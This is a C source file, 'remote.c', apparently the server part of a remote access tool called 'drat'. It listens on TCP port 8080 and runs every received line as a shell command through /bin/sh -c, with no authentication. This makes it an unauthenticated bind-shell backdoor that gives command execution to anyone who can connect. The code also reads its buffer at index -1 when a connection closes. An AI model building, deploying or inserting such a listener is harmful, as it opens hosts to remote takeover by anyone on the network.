/**
 * @file remote.c
 * @author Filip Naudot
 * @brief Establishes a connection and executes commands
 * @version 0.1
 * @date 2022-07-02
 * 
 */

#include "drat.h"
#include <ctype.h>

#define PORT "8080"

int main(int argc, char *argv[]) {
    printf("Configuring local address...\n");

    addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    addrinfo *bind_address;
    getaddrinfo(0, PORT, &hints, &bind_address);


    printf("Creating socket...\n");
    SOCKET socket_listen;
    socket_listen = socket(bind_address->ai_family,
                            bind_address->ai_socktype, bind_address->ai_protocol);
    if (!ISVALIDSOCKET(socket_listen)) {
        fprintf(stderr, "socket() failed. (%d)\n", GETSOCKETERRNO());
        return 1;
    }


    printf("Binding socket to local address...\n");
    if (bind(socket_listen, bind_address->ai_addr, bind_address->ai_addrlen)) {
        fprintf(stderr, "bind() failed. (%d)\n", GETSOCKETERRNO());
        return 1;
    }
    freeaddrinfo(bind_address);

    printf("Listening...\n");
    if (listen(socket_listen, 10) < 0) {
        fprintf(stderr, "listen() failed. (%d)\n", GETSOCKETERRNO());
        return 1;
    }

    fd_set master;
    FD_ZERO(&master);
    FD_SET(socket_listen, &master);
    SOCKET max_socket = socket_listen;

    printf("Waiting for connections...\n");

    while(1) {
        fd_set reads;
        reads = master;
        if (select(max_socket+1, &reads, 0, 0, 0) < 0) {
            fprintf(stderr, "select() failed. (%d)\n", GETSOCKETERRNO());
            return 1;
        }

        for(SOCKET i = 1; i <= max_socket; ++i) {
            if (FD_ISSET(i, &reads)) {

                if (i == socket_listen) {
                    struct sockaddr_storage client_address;
                    socklen_t client_len = sizeof(client_address);
                    SOCKET socket_client = accept(socket_listen,
                            (struct sockaddr*) &client_address,
                            &client_len);
                    if (!ISVALIDSOCKET(socket_client)) {
                        fprintf(stderr, "accept() failed. (%d)\n",
                                GETSOCKETERRNO());
                        return 1;
                    }

                    FD_SET(socket_client, &master);
                    if (socket_client > max_socket) {
                        max_socket = socket_client;
                    }

                    char address_buffer[100];
                    getnameinfo((struct sockaddr*)&client_address, client_len,
                                address_buffer, sizeof(address_buffer), 0, 0,
                                NI_NUMERICHOST);
                    printf("New connection from %s\n", address_buffer);

                } else {
                    char read[MAX_RECEIVE] = {0}; // Buffer to read in to
                    int bytes_received = recv(i, read, MAX_RECEIVE, 0); // receieve MAX_RECEIVE bytes
                    // remove traling new line char
                    if (read[bytes_received - 1] == '\n') read[bytes_received - 1] = '\0';

                    if (bytes_received < 1) {
                        #ifdef VERBOSE
                        printf("Connection closed\n");
                        #endif
                        FD_CLR(i, &master);
                        CLOSESOCKET(i);
                        continue;
                    }
                    
                    #ifdef VERBOSE
                    printf("Recieved %d bytes\n", bytes_received);

                    for (int i = 0; i < bytes_received; i++) {
                        printf("%c", read[i]);
                    }
                    printf("\n");
                    #endif

                    if (execute_command(read) < 0) {
                        // TODO: add error print function
                        exit(EXIT_FAILURE);
                    }


                    for (int j = 0; j < bytes_received; ++j) {
                        read[j] = toupper(read[j]);
                    }
                    send(i, read, bytes_received, 0);
                }

            } //if FD_ISSET
        } //for i to max_socket
    } //while(1)

    return 0;
}


/**
 * @brief Executes given commands
 * 
 * @param commands buffer containing commands
 * @return int the execution status
 */
int execute_command(char* command) {
    pid_t pid;
    int status = 0;

    // Fork and execute command
    pid = fork();
    if(pid < 0) {
        #ifdef VERBOSE
        perror("Fork");
        #endif
        status = -1;
    }
    else if(pid == 0) {
        if(execl("/bin/sh", "sh", "-c", command, (char *) NULL) < 0) {
            #ifdef VERBOSE
            perror(command);
            #endif
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }
    // Wait for child process
    if(wait(&status) == -1) {
        #ifdef VERBOSE
        perror("wait");
        #endif
        status = -1;
    }
    if(WIFEXITED(status)) {
        if(WEXITSTATUS(status) == EXIT_FAILURE) {
            status = -1;
        }
    }
    return status;
}